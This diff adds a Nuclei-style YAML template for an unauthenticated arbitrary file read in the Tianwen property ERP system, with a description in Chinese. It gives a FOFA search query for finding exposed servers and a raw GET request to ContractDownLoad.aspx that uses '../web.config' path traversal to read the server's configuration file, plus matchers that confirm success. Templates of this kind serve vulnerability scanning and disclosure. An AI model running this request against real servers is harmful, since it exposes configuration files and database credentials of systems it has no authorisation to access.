@@ -1,0 +1,37 @@
+id: tianwenEPR-ContractDownLoad-File-reading
+
+info:
+  name: 天问物业ERP系统 ContractDownLoad.aspx 未授权任意文件读取漏洞
+  author: Unknown
+  severity: high
+  description: |-
+    fofa: body="天问物业ERP系统" || body="国家版权局软著登字第1205328号" || body="/HM/M_Main/frame/sso.aspx"
+      天问物业ERP系统在 ContractDownLoad.aspx 接口实现中未正确校验用户权限，导致攻击者可通过构造恶意请求读取敏感文件。该缺陷允许非授权访问服务器文件系统，可能暴露配置文件、数据库凭证等关键信息，形成持续性安全威胁。
+  reference:
+  - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247485313&idx=1&sn=4788d43c18efebbb1ac3aff74a77a9b8&chksm=c267b2b2f5103ba401665b975dd9d28afaf5d5a1641f28ec0f7b22c2e007dfa06eff886f6cb6&token=1439003696&lang=zh_CN#rd
+  tags: 天问物业ERP系统
+
+
+
+http:
+- raw:
+  - |
+    GET /HM/M_Main/InformationManage/ContractDownLoad.aspx?ContractFile=../web.config HTTP/1.1
+    Host: {{Hostname}}
+
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - '<configuration>'
+    - '</configuration>'
+    condition: and
+  - type: status
+    status:
+    - 200
+
+
+
+
+
